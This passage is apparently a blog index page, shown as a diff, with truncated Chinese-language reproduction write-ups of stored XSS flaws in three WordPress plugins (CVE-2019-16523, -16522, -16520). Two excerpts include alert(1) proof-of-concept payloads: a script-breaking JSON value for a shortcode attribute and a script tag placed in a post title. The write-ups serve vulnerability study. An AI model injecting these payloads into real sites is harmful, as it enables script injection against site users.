+        <h1 id="（CVE-2019-16523）WordPress-Plugin-Events-Manager-储存型xss"><a href="#（CVE-2019-16523）WordPress-Plugin-Events-Manager-储存型xss" class="headerlink" title="（CVE-2019-16523）WordPress Plugin - Events Manager 储存型xss"></a>（CVE-2019-16523）WordPress Plugin - Events Manager 储存型xss</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>WordPress的5.9.5版以上的事件管理器插件（又名”事件管理器”）容易受到存储的XSS的影响，这是由于编码不正确和插入提供给该插件提供的短码属性map_style（locations_map和events_map）的数据所致。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>wordpress &lt;= 5.9.5</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="1、利用过程"><a href="#1、利用过程" class="headerlink" title="1、利用过程"></a>1、利用过程</h3><p>要利用此漏洞，攻击者需要创建或编辑帖子并插入上面提到的短代码之一。在此示例中，我们使用locations_map简码并将属性设置<br>map_style为的base64编码值</p>
+<pre><code>&#123;&quot;a&quot;:&quot;test\&quot;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&#125;。
+</code></pre>
+<p>这将导致以下简码：</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Wordpress/Wordpress%20%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2019-16523%EF%BC%89WordPress%20Plugin%20-%20Events%20Manager%20%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Wordpress/Wordpress%20%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2019-16523%EF%BC%89WordPress%20Plugin%20-%20Events%20Manager%20%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" data-id="cl5c2qybw00lvy8v1a5kffptf" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Wordpress/Wordpress 插件漏洞/（CVE-2019-16522）WordPress Plugin - EU Cookie Law (GDPR)  储存型xss" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Wordpress/Wordpress%20%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2019-16522%EF%BC%89WordPress%20Plugin%20-%20EU%20Cookie%20Law%20(GDPR)%20%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" class="article-date">
+  <time datetime="2022-07-08T06:26:07.136Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-16522）WordPress-Plugin-EU-Cookie-Law-GDPR-储存型xss"><a href="#（CVE-2019-16522）WordPress-Plugin-EU-Cookie-Law-GDPR-储存型xss" class="headerlink" title="（CVE-2019-16522）WordPress Plugin - EU Cookie Law (GDPR) 储存型xss"></a>（CVE-2019-16522）WordPress Plugin - EU Cookie Law (GDPR) 储存型xss</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>WordPress的3.0.6版eu-cookie-law插件（又称为EU<br>Cookie法（GDPR））容易受到存储XSS的影响，原因是管理区域中几个配置选项的编码不正确以及显示的Cookie同意消息。这会影响”字体颜色”，”背景颜色”和”禁用Cookie”文本。具有高特权的攻击者可以攻击其他用户。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>wordpress &lt;= 3.0.6，可能更高</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>/wp-admin/options-general.php?page=peadig_eucookie
+</code></pre>
+<p>管理员可以在配置区域为插件设置多个选项。在插入HTML页面之前，大多数都可以正确转义。但是，可以利用三个设置值来插入任意JavaScript和HTML。那些是：</p>
+<p>字体颜色（ Font Color） 背景颜色 （Background Color） “禁用Cookie”文本<br>（&quot;Disable Cookie&quot; Text） “<br>Fontcolor”的值将插入到显示Cookie同意消息的每个页面上。默认情况下，其他两个仅可在管理区域中利用。</p>
+<p>以”字体颜色”为例</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Wordpress/Wordpress%20%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2019-16522%EF%BC%89WordPress%20Plugin%20-%20EU%20Cookie%20Law%20(GDPR)%20%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Wordpress/Wordpress%20%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2019-16522%EF%BC%89WordPress%20Plugin%20-%20EU%20Cookie%20Law%20(GDPR)%20%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" data-id="cl5c2qybv00lty8v1ghky21s6" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Wordpress/Wordpress 插件漏洞/（CVE-2019-16520）WordPress Plugin - All in One SEO Pack 储存型xss" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Wordpress/Wordpress%20%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2019-16520%EF%BC%89WordPress%20Plugin%20-%20All%20in%20One%20SEO%20Pack%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" class="article-date">
+  <time datetime="2022-07-08T06:26:07.133Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-16520）WordPress-Plugin-All-in-One-SEO-Pack-储存型xss"><a href="#（CVE-2019-16520）WordPress-Plugin-All-in-One-SEO-Pack-储存型xss" class="headerlink" title="（CVE-2019-16520）WordPress Plugin - All in One SEO Pack 储存型xss"></a>（CVE-2019-16520）WordPress Plugin - All in One SEO Pack 储存型xss</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>适用于WordPress的3.2.7之前的”all-in-one-seo-pack plugin”插件（aka All in<br>One SEO<br>Pack）易受存储XSS的影响，原因是该插件通过不安全的占位符替换提供的帖子的SEO特定描述的编码不正确。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>wordpress &lt;= 3.2.6</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="1、利用过程"><a href="#1、利用过程" class="headerlink" title="1、利用过程"></a>1、利用过程</h3><p>创建或编辑帖子时，可以设置以下值来显示漏洞：</p>
+<pre><code>Title: test_aiosp_title&amp;&lt;&gt;&quot;&#39;;&gt;&lt;script src=&#39;data:text/javascript,alert(1)&#39;&gt;&lt;/script&gt;a
+Description: test_aiosp_desc&amp;&lt;&gt;&quot;&#39;; pt:%post_title% wp_title:%wp_title% bd:%blog_description% sd:%site_description% bt: %blog_title% st: %site_title% desc:%description%
+</code></pre>
+<p>当帖子被保存并以后访问时，将显示JavaScript警报弹出窗口。生成的HTML页面将包含以下代码</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Wordpress/Wordpress%20%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2019-16520%EF%BC%89WordPress%20Plugin%20-%20All%20in%20One%20SEO%20Pack%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Wordpress/Wordpress%20%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2019-16520%EF%BC%89WordPress%20Plugin%20-%20All%20in%20One%20SEO%20Pack%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" data-id="cl5c2qybw00lxy8v11uma3fg3" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/22/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/21/">21</a><a class="page-number" href="/page/22/">22</a><span class="page-number current">23</span><a class="page-number" href="/page/24/">24</a><a class="page-number" href="/page/25/">25</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/24/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
